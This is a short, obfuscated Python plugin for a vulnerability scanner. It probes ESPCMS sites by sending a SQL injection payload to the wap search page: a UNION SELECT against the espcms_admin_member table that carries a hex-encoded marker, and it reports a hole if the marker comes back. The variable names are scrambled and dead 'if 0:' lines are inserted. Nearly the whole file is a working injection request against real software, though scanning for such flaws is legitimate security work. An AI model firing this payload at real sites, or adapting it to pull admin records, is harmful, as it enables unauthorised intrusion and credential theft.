# -*- coding: utf-8 -*-
from dummy import *
from miniCurl import Curl
curl = Curl()
 #Embedded file name: espcms_wap_inj.py
if 0:
    i11iIiiIii

def assign(service, arg):
    if service == 'espcms':
        return (True, arg)
        if 0:
            O0 / iIii1I11I1II1 % OoooooooOO - i1IIi


def audit(arg):
    o0OO00 = arg
    oo, i1iII1IiiIiI1, iIiiiI1IiI1I1, i1iII1IiiIiI1, i1iII1IiiIiI1 = curl.curl(o0OO00 + 'wap/index.php?ac=search&at=result&lng=cn&mid=3&tid=11&keyword=1&keyname=a.title&countnum=1&attr[jobnum]=1%27%20and%201=2%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0x40776562736166657363616E40,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45%20from%20espcms_admin_member;%23')
    if iIiiiI1IiI1I1 and iIiiiI1IiI1I1.find('@websafescan@') != -1:
        security_hole(o0OO00)
        if 0:
            OoOoOO00


if __name__ == '__main__':
    from dummy import *
